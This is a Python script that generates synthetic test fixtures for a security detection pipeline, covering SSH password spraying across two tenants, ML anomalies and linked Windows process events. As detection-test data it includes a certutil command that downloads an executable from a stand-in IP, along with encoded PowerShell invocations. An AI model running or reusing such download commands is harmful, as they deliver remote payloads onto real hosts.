"""Builds the SYNTHETIC integration fixtures in this folder
(run: python tests/fixtures/integration/make_fixtures.py).

Shaped after the reliability-branch schema and Bharat's anomaly output, to test what
Ramya asked for: latest snapshot selection, the six-username SSH scenario, tenant
isolation, and ML anomaly -> OCSF event linking. Nothing here is exported from ClickHouse.

- tenant-a: 203.0.113.77 tries six users on web-02, 5 s apart. The spraying finding is
  stored as 3 cumulative snapshots (3, 5, 6 uids) and the brute-force finding as 2
  (5, 6 uids); rows arrive out of order.
- tenant-b: the SAME attack (same IP, host, users and finding_uids) in another tenant,
  with its own events. It must become a separate incident.
- ML: one anomaly per tenant with only the fields Bharat listed (no host, user or
  process fields), linked to Windows 4688 / Sysmon 1 process-creation events. tenant-b
  has a process event on the same host name in the same minute.
"""

import importlib.util
import json
from pathlib import Path

import pandas as pd

HERE = Path(__file__).parent
NOTE = "SYNTHETIC TEST FIXTURE built by make_fixtures.py; not exported from ClickHouse."

_spec = importlib.util.spec_from_file_location("sigma_fx", HERE.parent / "sigma" / "make_fixtures.py")
sigma_fx = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(sigma_fx)

IP, HOST = "203.0.113.77", "web-02"
USERS = [("admin", True), ("root", False), ("ubuntu", False), ("oracle", True), ("test", True), ("postgres", True)]
SPRAY_UID, BRUTE_UID = "corr-spray-7f3a", "corr-brute-7f3a"   # stable ids: identical in both tenants


def ssh_tenant(tenant: str, minute: int):
    events = []
    for i, (user, invalid) in enumerate(USERS):
        e = sigma_fx.event(f"{tenant}-ssh-{user}", f"2026-10-27 10:{minute:02d}:{i * 5:02d}",
                           HOST, IP, 52000 + i, user, 5100 + i, invalid)
        e["tenant_uid"] = tenant
        events.append(e)
    uids = [e["finding_uid"] for e in events]
    t = lambda k: f"2026-10-27T10:{minute:02d}:{k:02d}Z"  # noqa: E731
    rows = []
    for version, n in [(1, 3), (2, 5), (3, 6)]:
        r = sigma_fx.correlation(SPRAY_UID, "pwd-spray-cor-1", "SSH Password Spraying", IP, "",
                                 uids[:n], t(0), t((n - 1) * 5), {"src_endpoint.ip": IP})
        rows.append({**r, "tenant_uid": tenant, "snapshot_version": version})
    for version, n in [(1, 5), (2, 6)]:
        r = sigma_fx.correlation(BRUTE_UID, "multiple_ssh_auth_failures", "Multiple SSH Authentication Failures",
                                 IP, HOST, uids[:n], t(0), t((n - 1) * 5),
                                 {"src_endpoint.ip": IP, "device.hostname": HOST})
        rows.append({**r, "tenant_uid": tenant, "snapshot_version": version})
    return rows, events


def process_event(uid, tenant, t, host, user, parent, process, cmd, code):
    ts = pd.Timestamp(t, tz="UTC")
    return {"class_uid": 1007, "class_name": "Process Activity", "finding_uid": uid, "tenant_uid": tenant,
            "time": int(ts.timestamp() * 1000), "time_dt": ts.isoformat(), "device_hostname": host,
            "user_name": user, "parent_process_name": parent, "process_name": process,
            "process_cmd_line": cmd, "event_code": code, "attacks": "[]", "raw_data": "{}"}


def ml_tenant(tenant: str):
    ev = [process_event(f"{tenant}-proc-{i}", tenant, f"2026-10-27 11:0{i}:00", "ws-07", "j.doe",
                        "C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        f"powershell -nop -enc SQBFAFgA{i}", "4688" if i % 2 == 0 else "1")
          for i in range(3)]
    anomaly = {"tenant_uid": tenant, "anomaly_uid": f"anom-{tenant}-01", "occurrence_count": 3,
               "first_seen_time": "2026-10-27T11:00:00Z", "last_seen_time": "2026-10-27T11:02:00Z",
               "mean_score": -0.041, "min_score": -0.067,
               "contributing_finding_uids": [e["finding_uid"] for e in ev],
               "ingested_at": "2026-10-27 11:05:00"}
    return anomaly, ev


corr_a, ssh_a = ssh_tenant("tenant-a", 30)
corr_b, ssh_b = ssh_tenant("tenant-b", 31)
correlations = [corr_a[2], corr_b[0], corr_a[0], corr_a[4], corr_b[2], corr_a[1], corr_b[3],
                corr_a[3], corr_b[1], corr_b[4]]                     # shuffled snapshots

anom_a, proc_a = ml_tenant("tenant-a")
anom_b, proc_b = ml_tenant("tenant-b")
# tenant-b process activity on a host with the same name, same minute: must not appear in tenant-a
noise_b = process_event("tenant-b-proc-noise", "tenant-b", "2026-10-27 11:01:30", "ws-07", "admin",
                        "C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\certutil.exe",
                        "certutil -urlcache -f http://198.51.100.9/a.exe a.exe", "4688")

FILES = {
    "correlations.json": correlations,
    "ocsf_events.json": ssh_a + ssh_b,
    "ml_anomalies.json": [anom_a, anom_b],
    "process_events.json": proc_a + proc_b + [noise_b],
}

if __name__ == "__main__":
    for name, data in FILES.items():
        (HERE / name).write_text(json.dumps({"_note": NOTE, "data": data}, indent=1), encoding="utf-8")
        print(f"wrote {name}: {len(data)} rows")
